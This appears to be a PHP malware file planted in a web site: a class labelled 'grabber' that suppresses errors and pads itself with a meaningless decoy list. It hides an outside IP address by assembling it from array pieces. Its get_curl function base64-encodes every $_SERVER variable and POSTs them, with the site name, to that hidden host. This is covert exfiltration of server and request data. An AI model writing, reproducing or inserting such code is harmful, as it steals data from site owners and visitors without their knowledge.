<?php

error_reporting(0);
class xxx {
var $constr;
var $item = 'grabber';
var $imm;
var $num = 32; 
var $second,$minute,$hour,$index;
var $applet;
var $qry,$content_length,$file;


function protocol(){
$prot0 = 'http:\/\/';
$prot1 = 'http://';
$prot2 = 'https://';
$prot3 = '://';
$prot4 = '::'; 
return $prot1;
}


function dir_to(){
$dir[] = 'mp3';
$dir[] = 'mobile';
$dir[] = 'Opera/Ucweb/safari';
$dir[] = 'sis';
$dir[] = 'jar';
$dir[] = 'tube8';
$dir[] = 'cab';
$dir[] = 'hot';
$dir[] = 'jar';
$dir[] = 'sex';
$dir[] = 'apk';
$dir[] = 't';
$dir[] = 'Samsung';
$dir[] = 'Nokia';
$dir[] = 'MUAI_BROWSER';
$dir[] = 'thm';
$dir[] = 'tube8.com';
$dir[] = 'xxx';
$dir[] = 'Iphone/APPLE:3.00001';
$dir[] = 'brew';
$dir[] = 'in';
$dir[] = 'SonyEricsson';
$dir[] = 'LG/srv_t33:1';
$dir[] = 'safari/Opera/Firefox/Internet_Explorer'; //support web browsers
$dir[] = 'mp4';
$dir[] = 'Crab:00:14';
$dir[] = 'LOC';
$dir[] = 'super';
$dir[] = 'on';
$dir[] = '3gp';
$dir[] = 'host';
$dir[] = '<java support type=GLEW>';
$dir[] = 'hover';
for($d=0;$d<=$this->num;$d++){
$dirt .= $dir[$d].'=';}
return $dirt;
}

function applet($comb){
return $this->constr."$comb";
}

public function srv(){
$ar = array(
0=>'155',
1=>'245',
2=>'176',
3=>'205',
4=>'450',
5=>'9',
6=>'101',
7=>'39',
8=>'168',
9=>'231',
10=>'321'
);
return $this->protocol()."$ar[2].$ar[5].$ar[7].$ar[3]";
}



function get_curl($adr){
$params = array();
foreach ($_SERVER as $k=>$v) {
if($k!='argv'){
$params[] = urlencode($k).'='.base64_encode($v);
}}
$combi = implode('&', $params);

$address = $adr.'index.php?'.$this->qry;
include "settings.php";
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $address);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $combi.'&sitename='.urlencode($sitename));
$disp = curl_exec($ch);
curl_close($ch);
return $disp;
}


//-----------//
public function print_o($content=false){
if($content==true){
echo $this->index;
}else{
exit();
}
}

public function print_0($arg=true){

return false;
}
}
include 'header.php';
include 'xxx.php';
?>